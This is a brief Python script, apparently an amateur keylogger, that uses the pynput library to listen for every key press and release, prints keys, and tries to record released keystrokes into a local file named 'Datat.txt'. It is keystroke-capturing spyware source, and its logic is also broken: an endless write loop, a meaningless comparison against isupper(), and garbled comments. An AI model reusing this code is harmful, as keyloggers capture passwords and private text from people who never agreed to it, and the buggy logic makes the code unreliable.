import os
import sys
from pynput import keyboard
from pynput.keyboard import Listener

# universal variables for alphabet letters
alphabet = 'abcdefghijklmnopqrstuvwxyz'

# define 'write' for when key is released
def write(key):

    # define value that stores strokes
    keydata = str(key)

    while True:
        # With file open with reading and writing permissions write and close the 'keydata' as sting characters
        with open('Datat.txt', 'r+') as file:
            # if keydata does not me earlier criteria then keydata is written.
            file.write(keydata)

    file.close()

# function when key is pressed
def on_press(key):
    # goes through lists that contain the alphabet and looks for
    for letter in alphabet:
            if key == letter.isupper():
                print("{0}".format(key.char))

            else:
                print ("{0}".format(key))


# Using Listener, everytime on_press is activated function write activates
# This also joins the characters
while True:
    with Listener(on_press=on_press, on_release=write) as listener:
        listener.join()

